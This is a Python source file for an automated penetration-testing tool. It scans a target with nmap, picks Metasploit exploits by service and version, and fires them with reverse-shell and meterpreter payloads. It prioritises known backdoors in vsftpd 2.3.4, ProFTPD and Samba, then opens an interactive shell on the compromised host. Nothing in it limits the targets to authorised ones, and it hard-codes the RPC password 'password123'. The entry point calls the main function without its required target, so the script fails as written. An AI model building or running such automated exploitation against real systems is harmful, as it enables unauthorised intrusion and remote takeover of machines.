import nmap
import subprocess, re, time, logging, json, pandas as pd
from datetime import datetime, timedelta
from pymetasploit3.msfrpc import MsfRpcClient
import socket
import os

# Create results directory
results_dir = f"autopentest_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
os.makedirs(results_dir, exist_ok=True)

# Setup logging to file
log_file = os.path.join(results_dir, f"autopentest_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s',
                   handlers=[logging.FileHandler(log_file), logging.StreamHandler()])
logger = logging.getLogger(__name__)

# File paths for saving results
NMAP_RESULTS_FILE = os.path.join(results_dir, "nmap_scan_results.json")
EXPLOIT_RESULTS_FILE = os.path.join(results_dir, "exploit_attempts.json")
FINAL_RESULTS_FILE = os.path.join(results_dir, "final_results.json")
ML_DATASET_FILE = os.path.join(results_dir, "ml_dataset.csv")


def save_nmap_results(target, scan_data):
    """Save nmap scan results to file"""
    try:
        results = {
            'timestamp': datetime.now().isoformat(),
            'target': target,
            'scan_data': scan_data
        }
        with open(NMAP_RESULTS_FILE, 'w') as f:
            json.dump(results, f, indent=4)
        print(f"[+] Nmap results saved to: {NMAP_RESULTS_FILE}")
    except Exception as e:
        print(f"[-] Failed to save nmap results: {e}")


def save_exploit_attempt(service, exploit_name, port, status, output=None, session_created=False):
    """Save individual exploit attempt results"""
    try:
        # Read existing data or create new
        try:
            with open(EXPLOIT_RESULTS_FILE, 'r') as f:
                exploit_data = json.load(f)
        except FileNotFoundError:
            exploit_data = {'exploit_attempts': []}
        
        attempt = {
            'timestamp': datetime.now().isoformat(),
            'service': service,
            'port': port,
            'exploit': exploit_name,
            'status': status,
            'session_created': session_created,
            'output': output[:1000] if output else None  # Limit output size
        }
        
        exploit_data['exploit_attempts'].append(attempt)
        
        with open(EXPLOIT_RESULTS_FILE, 'w') as f:
            json.dump(exploit_data, f, indent=4)
            
        print(f"    [SAVED] Exploit attempt saved to: {EXPLOIT_RESULTS_FILE}")
    except Exception as e:
        print(f"    [ERROR] Failed to save exploit attempt: {e}")


def save_final_results(target, services, successful_exploits, sessions_created):
    """Save final penetration test results"""
    try:
        results = {
            'timestamp': datetime.now().isoformat(),
            'target': target,
            'services_found': services,
            'successful_exploits': successful_exploits,
            'sessions_created': sessions_created,
            'summary': {
                'total_services': len(services),
                'successful_exploits_count': len(successful_exploits),
                'sessions_count': len(sessions_created),
                'success_rate': f"{(len(successful_exploits) / len(services) * 100) if services else 0:.1f}%"
            }
        }
        
        with open(FINAL_RESULTS_FILE, 'w') as f:
            json.dump(results, f, indent=4)
        print(f"[+] Final results saved to: {FINAL_RESULTS_FILE}")
    except Exception as e:
        print(f"[-] Failed to save final results: {e}")


def create_ml_dataset(exploit_attempts_file=EXPLOIT_RESULTS_FILE, output_file=ML_DATASET_FILE):
    """Create ML dataset from exploit attempts for Random Forest"""
    try:
        # Load exploit attempts
        with open(exploit_attempts_file, 'r') as f:
            data = json.load(f)
        
        ml_data = []
        
        for attempt in data.get('exploit_attempts', []):
            features = extract_ml_features(attempt)
            if features:
                ml_data.append(features)
        
        if ml_data:
            # Create DataFrame
            df = pd.DataFrame(ml_data)
            
            # Save to CSV
            df.to_csv(output_file, index=False)
            print(f"[+] ML dataset created: {output_file}")
            print(f"[+] Dataset shape: {df.shape}")
            print(f"[+] Success rate: {df['success'].mean():.2%}")
            
            # Show feature summary
            print(f"\n[+] Features available for Random Forest:")
            for col in df.columns:
                if col != 'success':
                    print(f"    - {col}: {df[col].dtype}")
            
            return df
        else:
            print("[-] No valid data for ML dataset")
            return None
            
    except Exception as e:
        print(f"[-] Failed to create ML dataset: {e}")
        return None


def extract_ml_features(attempt):
    """Extract features for machine learning from exploit attempt"""
    try:
        features = {}
        
        # Target variable
        features['success'] = 1 if attempt.get('session_created', False) else 0
        
        # Service features
        service_info = attempt.get('service', {})
        if isinstance(service_info, dict):
            service_name = service_info.get('service', 'unknown')
            port = service_info.get('port', 0)
            version = service_info.get('version', 'unknown')
        else:
            service_name = str(service_info)
            port = attempt.get('port', 0)
            version = 'unknown'
        
        # Basic service features
        features['service_name'] = service_name
        features['port'] = port
        features['is_well_known_port'] = 1 if port < 1024 else 0
        
        # Service type indicators (one-hot encoding preparation)
        features['is_http'] = 1 if any(x in service_name.lower() for x in ['http', 'www', 'apache', 'nginx', 'iis']) else 0
        features['is_ftp'] = 1 if 'ftp' in service_name.lower() else 0
        features['is_ssh'] = 1 if 'ssh' in service_name.lower() else 0
        features['is_smb'] = 1 if any(x in service_name.lower() for x in ['smb', 'samba', 'netbios', 'microsoft-ds']) else 0
        features['is_telnet'] = 1 if 'telnet' in service_name.lower() else 0
        features['is_mysql'] = 1 if 'mysql' in service_name.lower() else 0
        features['is_rdp'] = 1 if 'rdp' in service_name.lower() else 0
        
        # Port-based features
        common_ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 993, 995, 3306, 3389, 5432, 5900]
        features['is_common_port'] = 1 if port in common_ports else 0
        
        # Version features
        features['has_version_info'] = 1 if version and version != 'unknown' else 0
        features['version_length'] = len(str(version))
        
        # Extract version numbers
        version_numbers = re.findall(r'\d+\.\d+\.\d+|\d+\.\d+|\d+', str(version))
        features['major_version'] = float(version_numbers[0]) if version_numbers else 0.0
        features['minor_version'] = float(version_numbers[1]) if len(version_numbers) > 1 else 0.0
        features['patch_version'] = float(version_numbers[2]) if len(version_numbers) > 2 else 0.0
        
        # Known vulnerability indicators
        features['is_vsftpd_234'] = 1 if 'vsftpd 2.3.4' in str(version).lower() else 0
        features['is_proftpd_131'] = 1 if 'proftpd 1.3.1' in str(version).lower() else 0
        features['is_samba_3x'] = 1 if 'samba' in str(version).lower() and '3.' in str(version) else 0
        features['is_openssh_old'] = 1 if 'openssh' in str(version).lower() and any(v in str(version) for v in ['4.', '5.', '6.']) else 0
        
        # Exploit features
        exploit_name = attempt.get('exploit', '')
        features['exploit_name'] = exploit_name
        features['is_remote_exploit'] = 1 if '/local/' not in exploit_name else 0
        features['is_web_exploit'] = 1 if '/http/' in exploit_name or 'web' in exploit_name.lower() else 0
        features['is_ftp_exploit'] = 1 if '/ftp/' in exploit_name else 0
        features['is_ssh_exploit'] = 1 if '/ssh/' in exploit_name else 0
        
        # Exploit rank estimation (you can enhance this with actual Metasploit data)
        if 'excellent' in exploit_name.lower() or '234_backdoor' in exploit_name:
            features['exploit_rank_score'] = 4
        elif 'great' in exploit_name.lower() or 'usermap_script' in exploit_name:
            features['exploit_rank_score'] = 3
        elif 'good' in exploit_name.lower():
            features['exploit_rank_score'] = 2
        elif 'normal' in exploit_name.lower():
            features['exploit_rank_score'] = 1
        else:
            features['exploit_rank_score'] = 2  # Default
        
        # Output analysis features
        output = attempt.get('output', '')
        features['output_contains_shell'] = 1 if any(indicator in output.lower() for indicator in 
                                                   ['shell', 'session', 'meterpreter', 'connected']) else 0
        features['output_contains_error'] = 1 if any(indicator in output.lower() for indicator in 
                                                   ['error', 'failed', 'unreachable', 'timeout']) else 0
        features['output_length'] = len(output)
        
        # Status features
        status = attempt.get('status', '')
        features['status_success'] = 1 if 'success' in status.lower() else 0
        features['status_failed'] = 1 if 'failed' in status.lower() else 0
        features['status_error'] = 1 if 'error' in status.lower() else 0
        
        return features
        
    except Exception as e:
        print(f"    [ERROR] Failed to extract features: {e}")
        return None


def start_msf_rpc():
    print("[*] Starting MSF RPC Server...")
    
    subprocess.run(['pkill', '-9', '-f', 'msfrpcd'], capture_output=True)
    time.sleep(2)
    
    process = subprocess.Popen(
        ['msfrpcd', '-U', 'msf', '-P', 'password123', '-p', '55553', '-a', '127.0.0.1', '-S'],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    
    time.sleep(5)
    
    if is_port_open('127.0.0.1', 55553):
        print("[+] MSF RPC Server started successfully")
        return True
    else:
        print("[-] MSF RPC Server failed to start")
        stdout, stderr = process.communicate(timeout=1)
        if stderr:
            print(f"Error: {stderr}")
        return False 
    
def is_port_open(host, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(2)
            result = sock.connect_ex((host, port))
            return result == 0
    except:
        return False

class AutoPenTest:
    def __init__(self, pwd, host='127.0.0.1', port=55553):
        try:
            self.client = MsfRpcClient(pwd, host=host, port=port, ssl=False)
            self.target = self.services = None
            self.successful_exploits = []
            self.sessions_created = []
            print(f"[+] Connected to MSF RPC")
        except Exception as e:
            print(f"[-] Failed to connect to MSF RPC: {e}")
            raise

    def attack(self, target):
        self.target = target
        print(f"\n{'='*60}\n[*] AUTO ATTACK: {target}\n{'='*60}\n")
        
        print("[*] Phase 1: Scanning...")
        if not self._scan(): 
            print("[-] No open ports found")
            return
        
        print("\n[*] Phase 2: Checking sessions...")
        if self._use_session(): 
            return
        
        print("\n[*] Phase 3: Exploiting...")
        success = self._exploit()
        
        # Save final results
        save_final_results(self.target, self.services, self.successful_exploits, self.sessions_created)
        
        # Create ML dataset
        print(f"\n[*] Creating ML dataset for Random Forest...")
        ml_df = create_ml_dataset()
        
        if ml_df is not None:
            print(f"[+] ML dataset ready for Random Forest training!")
            print(f"[+] Use this dataset to train your model later")
        
        if not success:
            print("[-] Attack failed - no successful exploits")

    def _scan(self):
        try:
            print("[*] Starting nmap scan...")
            nm = nmap.PortScanner()
            
            scan_result = nm.scan(
                hosts=self.target,
                arguments='-sS -sV -T4 --top-ports 100 --open'
            )
            
            if self.target not in scan_result['scan']:
                print("[-] Target not found in scan results")
                return False
            
            self.services = []
            host_result = scan_result['scan'][self.target]
            
            if 'tcp' in host_result:
                for port, port_info in host_result['tcp'].items():
                    if port_info['state'] == 'open':
                        service = port_info.get('name', 'unknown')
                        version = port_info.get('version', '')
                        product = port_info.get('product', '')
                        
                        # Build version string
                        version_str = f"{product} {version}".strip()
                        
                        s = {
                            'port': port,
                            'service': service,
                            'version': version_str
                        }
                        self.services.append(s)
                        print(f"[+] {s['port']}/tcp - {s['service']} - {s['version']}")
            
            if not self.services:
                print("[-] No open ports found")
                return False
                
            print(f"[+] Found {len(self.services)} open ports")
            
            # Save nmap results
            save_nmap_results(self.target, {
                'open_ports': self.services,
                'nmap_scan_data': scan_result
            })
            
            return True
            
        except nmap.PortScannerError as e:
            print(f"[-] Nmap scan error: {e}")
            return False
        except Exception as e:
            logger.error(f"Scan error: {e}")
            print(f"[-] Scan failed: {e}")
            return False

    def _use_session(self):
        try:
            sessions = self.client.sessions.list
            if sessions:
                print(f"[+] Found {len(sessions)} existing sessions")
                for sid, info in sessions.items():
                    target_host = info.get('target_host')
                    session_host = info.get('session_host')
                    if target_host == self.target or session_host == self.target:
                        print(f"[+] Using existing session {sid}")
                        return self._shell(sid)
                print(f"[-] No matching session for {self.target}")
            else:
                print("[-] No existing sessions")
            return False
        except Exception as e:
            logger.error(f"Session check error: {e}")
            return False

    def _exploit(self):
        success = False
        
        for svc in self.services:
            print(f"\n[*] Attacking {svc['service']} on port {svc['port']}")
            print(f"[*] Version: {svc['version']}")
            
            # Get SMART exploit selection (prioritizes checkable exploits)
            exploits = self._get_smart_exploit_selection(svc)
            
            if not exploits:
                print(f"[-] No suitable exploits found for: {svc['version']}")
                save_exploit_attempt(svc, "None", svc['port'], "No exploits found")
                continue
            
            # Try exploits in smart order
            print(f"[*] Trying {len(exploits)} prioritized exploits...")
            for i, exploit_tuple in enumerate(exploits, 1):
                exploit_name = exploit_tuple[0]
                reason = exploit_tuple[1]
                print(f"[{i}/{len(exploits)}] Trying: {exploit_name}")
                print(f"    Reason: {reason}")
                
                exploit_success = self._launch_exploit(svc['service'], exploit_name, svc['port'])
                if exploit_success:
                    success = True
                    self.successful_exploits.append({
                        'service': svc,
                        'exploit': exploit_name,
                        'port': svc['port'],
                        'timestamp': datetime.now().isoformat()
                    })
                    break
            if success:
                break
                    
        return success

    def _get_smart_exploit_selection(self, service):
        """Smart exploit selection with known vulnerability targeting"""
        all_exploits = self._search_exploits_comprehensive(service)
        
        # Check for known vulnerable services and add specific exploits
        known_exploits = self._get_known_vulnerability_exploits(service)
        for known_exp in known_exploits:
            # Add to beginning of list for priority
            all_exploits.insert(0, known_exp)
        
        if not all_exploits:
            return []
        
        # Categorize exploits by priority
        priority_exploits = []
        good_exploits = []
        other_exploits = []
        
        for exploit in all_exploits:
            name = exploit['fullname']
            rank = exploit.get('rank', 'normal')
            check = exploit.get('check', False)
            disclosure = exploit.get('disclosure_date', '')
            
            # Priority 1: Checkable + High Rank + Recent
            if check and rank in ['excellent', 'great']:
                reason = f"Checkable + {rank} rank"
                if disclosure and self._is_recent(disclosure):
                    reason += " + Recent"
                priority_exploits.append((name, reason))
            
            # Priority 2: Checkable + Any Rank
            elif check:
                reason = f"Checkable + {rank} rank"
                good_exploits.append((name, reason))
            
            # Priority 3: High Rank without check
            elif rank in ['excellent', 'great']:
                reason = f"{rank} rank (no check)"
                other_exploits.append((name, reason))
            
            # Priority 4: Everything else
            else:
                reason = f"{rank} rank"
                other_exploits.append((name, reason))
        
        # Combine in priority order
        smart_selection = priority_exploits + good_exploits + other_exploits
        
        # Remove duplicates
        seen = set()
        unique_selection = []
        for exp in smart_selection:
            if exp[0] not in seen:
                seen.add(exp[0])
                unique_selection.append(exp)
        
        # Limit to top 5
        return unique_selection[:5]

    def _get_known_vulnerability_exploits(self, service):
        """Add known exploits for specific vulnerable services"""
        known_exploits = []
        
        # vsftpd 2.3.4 backdoor - FIXED: Use the correct exploit module
        if service['service'] == 'ftp' and 'vsftpd 2.3.4' in service['version']:
            known_exploits.append({
                'fullname': 'exploit/unix/ftp/vsftpd_234_backdoor',
                'rank': 'excellent',
                'check': False,
                'disclosure_date': '2011-07-03',
                'description': 'VSFTPD 2.3.4 Backdoor Command Execution'
            })
            print("[!] Found known vulnerable service: vsftpd 2.3.4 - Adding backdoor exploit")
        
        # ProFTPD 1.3.1 - try different exploits
        if service['service'] == 'ftp' and 'ProFTPD 1.3.1' in service['version']:
            known_exploits.extend([
                {
                    'fullname': 'exploit/unix/ftp/proftpd_133c_backdoor', 
                    'rank': 'excellent',
                    'check': False,
                    'disclosure_date': '2010-12-02',
                    'description': 'ProFTPD 1.3.1 Backdoor Command Execution'
                },
                {
                    'fullname': 'exploit/unix/ftp/proftpd_modcopy_exec',
                    'rank': 'excellent',
                    'check': False,
                    'disclosure_date': '2010-12-02',
                    'description': 'ProFTPD 1.3.1 Mod_Copy Command Execution'
                }
            ])
            print("[!] Found known vulnerable service: ProFTPD 1.3.1 - Adding backdoor exploits")
        
        # Samba exploits for ports 139/445
        if service['service'] in ['netbios-ssn', 'microsoft-ds'] and 'Samba' in service['version']:
            known_exploits.extend([
                {
                    'fullname': 'exploit/multi/samba/usermap_script',
                    'rank': 'excellent',
                    'check': True,
                    'disclosure_date': '2007-05-14',
                    'description': 'Samba "username map script" Command Execution'
                },
                {
                    'fullname': 'exploit/linux/samba/chain_reply',
                    'rank': 'great',
                    'check': False,
                    'disclosure_date': '2010-06-01',
                    'description': 'Samba Chain Reply Memory Corruption'
                }
            ])
            print("[!] Found Samba service - Adding Samba exploits")
        
        return known_exploits

    def _search_exploits_comprehensive(self, service):
        """Comprehensive exploit search with detailed analysis"""
        all_exploits = []
        
        # Get search terms
        search_terms = self._get_smart_search_terms(service)
        
        print(f"[*] Smart search terms: {search_terms}")
        
        # Search for each term
        for term in search_terms:
            if term and term != 'unknown':
                found = self._search_exploits_with_details(term)
                all_exploits.extend(found)
        
        # Remove duplicates
        unique_exploits = {}
        for exploit in all_exploits:
            unique_exploits[exploit['fullname']] = exploit
        
        return list(unique_exploits.values())

    def _get_smart_search_terms(self, service):
        """Generate smart search terms based on service analysis"""
        terms = []
        
        # Service-specific intelligence
        service_intel = self._get_service_intelligence(service['service'])
        terms.extend(service_intel)
        
        # Version-based terms
        version_terms = self._extract_smart_version_terms(service['version'])
        terms.extend(version_terms)
        
        # Port-based terms
        port_terms = self._get_port_intelligence(service['port'])
        terms.extend(port_terms)
        
        # Remove duplicates and empty terms
        terms = list(set([term for term in terms if term and term != 'unknown']))
        
        return terms

    def _get_service_intelligence(self, service_name):
        """Service-specific search intelligence"""
        intel_map = {
            'http': ['http', 'apache', 'nginx', 'iis', 'tomcat', 'webdav', 'wordpress'],
            'ssh': ['ssh', 'openssh', 'dropbear'],
            'ftp': ['ftp', 'vsftpd', 'proftpd', 'pure-ftpd'],
            'smb': ['smb', 'samba', 'eternalblue', 'ms17-010', 'psexec'],
            'microsoft-ds': ['smb', 'samba', 'eternalblue', 'ms17-010'],
            'mysql': ['mysql', 'mariadb'],
            'rdp': ['rdp', 'bluekeep', 'remote desktop'],
            'telnet': ['telnet'],
            'dns': ['dns', 'bind'],
            'snmp': ['snmp'],
        }
        
        return intel_map.get(service_name, [service_name])

    def _extract_smart_version_terms(self, version_string):
        """Extract intelligent version terms"""
        if not version_string or version_string == 'unknown':
            return []
        
        terms = []
        
        # Software identification
        software_terms = self._identify_software(version_string)
        terms.extend(software_terms)
        
        # Version numbers
        versions = re.findall(r'\d+\.\d+\.\d+|\d+\.\d+|\d+', version_string)
        terms.extend(versions)
        
        # CVE/MS patterns
        security_terms = re.findall(r'CVE[-\_]?\d{4}[-\_]?\d+|MS[-\_]?\d{2}[-\_]?\d{3}', version_string, re.IGNORECASE)
        terms.extend(security_terms)
        
        return terms

    def _identify_software(self, version_string):
        """Identify specific software from version string"""
        version_lower = version_string.lower()
        software = []
        
        if any(term in version_lower for term in ['apache', 'httpd']):
            software.extend(['apache', 'httpd'])
        if 'nginx' in version_lower:
            software.append('nginx')
        if any(term in version_lower for term in ['iis', 'microsoft', 'windows']):
            software.extend(['iis', 'windows'])
        if 'openssh' in version_lower:
            software.append('openssh')
        if 'vsftpd' in version_lower:
            software.append('vsftpd')
        if 'proftpd' in version_lower:
            software.append('proftpd')
        if 'samba' in version_lower:
            software.append('samba')
        
        return software

    def _get_port_intelligence(self, port):
        """Get intelligence based on port number"""
        port_map = {
            21: ['ftp'],
            22: ['ssh', 'openssh'],
            23: ['telnet'],
            25: ['smtp'],
            53: ['dns'],
            80: ['http', 'apache', 'nginx', 'iis'],
            110: ['pop3'],
            139: ['netbios', 'smb', 'samba'],
            143: ['imap'],
            443: ['https', 'ssl'],
            445: ['smb', 'samba', 'eternalblue'],
            993: ['imaps'],
            995: ['pop3s'],
            1433: ['mssql'],
            1521: ['oracle'],
            3306: ['mysql'],
            3389: ['rdp', 'bluekeep'],
            5432: ['postgresql'],
            5900: ['vnc'],
        }
        
        return port_map.get(port, [])

    def _search_exploits_with_details(self, search_term):
        """Search exploits and return detailed information"""
        print(f"    Searching: '{search_term}'")
        
        exploits = []
        try:
            results = self.client.modules.search(search_term)
            
            for module in results:
                if module.get('type') == 'exploit':
                    exploits.append({
                        'fullname': module['fullname'],
                        'rank': module.get('rank', 'normal'),
                        'check': module.get('check', False),
                        'disclosure_date': module.get('disclosure_date', ''),
                        'description': module.get('description', '')
                    })
            
            return exploits
            
        except Exception as e:
            print(f"    Search error: {e}")
            return []

    def _is_recent(self, date_string):
        """Check if disclosure date is recent (within 2 years)"""
        if not date_string:
            return False
        
        try:
            disclosure_date = datetime.strptime(date_string, '%Y-%m-%d')
            two_years_ago = datetime.now() - timedelta(days=730)
            return disclosure_date > two_years_ago
        except:
            return False

    def _get_local_ip(self):
        """Get the correct local IP address automatically"""
        try:
            # Connect to a remote address to determine local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "127.0.0.1"

    def _extract_output_text(self, output_data):
        """Extract text from console output whether it's a dict or string"""
        if isinstance(output_data, dict):
            return output_data.get('data', '')
        elif isinstance(output_data, str):
            return output_data
        else:
            return str(output_data)

    def _launch_exploit(self, service, exploit_name, port):
        """Fixed exploit launcher with proper vsftpd configuration"""
        try:
            print(f"    [LAUNCH] Starting: {exploit_name}")
            
            # Get sessions before exploit
            old_sessions = set(self.client.sessions.list.keys()) if self.client.sessions.list else set()
            console = self.client.consoles.console()
            
            # Configure exploit
            commands = [
                f"use {exploit_name}",
                f"set RHOSTS {self.target}",
                f"set RPORT {port}",
            ]
            
            # Special configuration for vsftpd backdoor - FIXED
            if "vsftpd_234_backdoor" in exploit_name:
                print("    [VSFTPD] Configuring special backdoor options...")
                # vsftpd backdoor doesn't need LHOST or payload - it triggers on specific command
                commands.extend([
                    "set payload cmd/unix/interact",
                ])
            # Configuration for other exploits
            else:
                lhost = self._get_local_ip()
                print(f"    [CONFIG] Using LHOST: {lhost}")
                commands.append(f"set LHOST {lhost}")
                
                # Set appropriate payload
                payload = self._get_appropriate_payload(exploit_name, port)
                if payload:
                    commands.append(f"set payload {payload}")
            
            commands.extend(["exploit", ""])
            
            # Execute commands
            for cmd in commands:
                if cmd.strip():
                    console.write(cmd + '\n')
                    time.sleep(2)  # Increased delay for vsftpd
            
            # Special handling for vsftpd - it needs time to trigger
            if "vsftpd_234_backdoor" in exploit_name:
                print("    [VSFTPD] Waiting for backdoor trigger...")
                time.sleep(5)
            
            # Monitor for results
            print("    [STATUS] Monitoring exploit...")
            session_created = False
            exploit_output = ""
            
            for attempt in range(25):  # Increased attempts for vsftpd
                time.sleep(2)
                
                # Check for new sessions
                current_sessions = set(self.client.sessions.list.keys()) if self.client.sessions.list else set()
                new_sessions = current_sessions - old_sessions
                
                if new_sessions:
                    sid = list(new_sessions)[0]
                    session_info = self.client.sessions.list.get(sid, {})
                    print(f"[+] SUCCESS! Session {sid} opened")
                    print(f"[+] Session type: {session_info.get('type', 'unknown')}")
                    
                    # Save successful exploit
                    save_exploit_attempt(
                        f"{port}/{service}", exploit_name, port, 
                        "SUCCESS", exploit_output, True
                    )
                    
                    self.sessions_created.append({
                        'session_id': sid,
                        'type': session_info.get('type', 'unknown'),
                        'exploit': exploit_name,
                        'timestamp': datetime.now().isoformat()
                    })
                    
                    console.destroy()
                    return self._shell(sid)
                
                # Read console output
                output = console.read()
                if output:
                    output_text = self._extract_output_text(output)
                    exploit_output += output_text
                    
                    # Check for success indicators
                    if any(indicator in output_text.lower() for indicator in [
                        "meterpreter session", 
                        "command shell session", 
                        "session created",
                        "opened session",
                        "command shell",
                        "connected to",
                        "found shell",
                        "backdoor service has been spawned",
                        "uid=",  # Linux shell indicator
                        "whoami",  # Command execution
                        "root"  # Privilege indicator
                    ]):
                        print("    [SUCCESS] Session indicator found in output!")
                        session_created = True
                        
                        # Try to find the session ID in the output
                        session_match = re.search(r'Session (\d+)', output_text)
                        if session_match:
                            sid = session_match.group(1)
                            if sid in self.client.sessions.list:
                                console.destroy()
                                return self._shell(sid)
            
            if not session_created:
                print("[-] No session created")
                # Save failed attempt
                save_exploit_attempt(
                    f"{port}/tcp", exploit_name, port, 
                    "FAILED", exploit_output, False
                )
                
                # For vsftpd, try manual session check
                if "vsftpd_234_backdoor" in exploit_name:
                    print("    [VSFTPD] Manual session check...")
                    current_sessions = set(self.client.sessions.list.keys()) if self.client.sessions.list else set()
                    new_sessions = current_sessions - old_sessions
                    if new_sessions:
                        sid = list(new_sessions)[0]
                        print(f"[+] Found session after manual check: {sid}")
                        console.destroy()
                        return self._shell(sid)
                
            console.destroy()
            return False
                
        except Exception as e:
            logger.error(f"Exploit error: {e}")
            print(f"[-] Exploit failed: {str(e)}")
            # Save error attempt
            save_exploit_attempt(
                f"{port}/tcp", exploit_name, port, 
                f"ERROR: {str(e)}", None, False
            )
            return False

    def _get_appropriate_payload(self, exploit_name, port):
        """Get appropriate payload for the exploit and service"""
        exploit_name_lower = exploit_name.lower()
        
        # Service-specific payload selection
        service_payloads = {
            21: 'cmd/unix/reverse',                    # FTP
            22: 'cmd/unix/reverse',                    # SSH  
            23: 'cmd/unix/reverse',                    # Telnet
            25: 'cmd/unix/reverse',                    # SMTP
            80: 'php/meterpreter/reverse_tcp',         # HTTP
            111: 'cmd/unix/reverse',                   # RPC
            139: 'linux/x86/meterpreter/reverse_tcp',  # Samba (Linux)
            445: 'linux/x86/meterpreter/reverse_tcp',  # Samba (Linux)
            3306: 'cmd/unix/reverse',                  # MySQL
            5432: 'cmd/unix/reverse',                  # PostgreSQL
            5900: 'cmd/unix/reverse',                  # VNC
        }
        
        # Platform-specific payloads
        if 'windows' in exploit_name_lower:
            return 'windows/meterpreter/reverse_tcp'
        elif 'linux' in exploit_name_lower or 'unix' in exploit_name_lower:
            return 'cmd/unix/reverse'
        elif 'php' in exploit_name_lower:
            return 'php/meterpreter/reverse_tcp'
        elif 'http' in exploit_name_lower:
            return 'php/meterpreter/reverse_tcp'
        elif 'samba' in exploit_name_lower:
            return 'linux/x86/meterpreter/reverse_tcp'
        else:
            return service_payloads.get(port, 'cmd/unix/reverse')
    
    def _shell(self, sid):
        try:
            if sid not in self.client.sessions.list:
                print(f"[-] Session {sid} not found")
                return False
            
            session = self.client.sessions.session(sid)
            info = self.client.sessions.list.get(sid, {})
            
            print(f"\n{'='*60}\n[+] SHELL ACCESS - Session {sid}\n[+] Target: {info.get('target_host', 'unknown')}\n{'='*60}\n")
            
            while True:
                try:
                    if sid not in self.client.sessions.list:
                        print("\n[!] Session died")
                        return False
                    
                    cmd = input(f"shell@{self.target}> ").strip()
                    if not cmd:
                        continue
                    if cmd == 'exit':
                        break
                    if cmd == 'info':
                        print(f"\nSession: {sid} | Type: {info.get('type')} | Target: {info.get('target_host')}\n")
                        continue
                    
                    session.write(cmd + '\n')
                    time.sleep(0.8)
                    out = session.read()
                    if not out:
                        time.sleep(0.5)
                        out = session.read()
                    print(out if out else "[*] No output")
                    
                except KeyboardInterrupt:
                    print("\n[*] Use 'exit' to quit")
                except Exception as e:
                    print(f"\n[!] Error: {e}")
                    break
                    
            return True
            
        except Exception as e:
            logger.error(f"Shell error: {e}")
            return False


def MainPenTest(target):
    print(f"[*] Results will be saved in: {results_dir}")
    
    if is_port_open('127.0.0.1', 55553):
        print("[+] MSF RPC is already running")
    else:
        print("[*] Starting MSF RPC Server...")
        if not start_msf_rpc():
            print("[-] Failed to start MSF RPC, exiting...")
            return
    
    Password = 'password123'
    Host = '127.0.0.1'
    Port = int('55553')
    
    try:
        apt = AutoPenTest(Password, Host, Port)
        if target:
            apt.attack(target)
        else:
            print("[-] No target specified")
    except Exception as e:
        print(f"\n[-] Error: {e}")


if __name__ == "__main__":
    MainPenTest()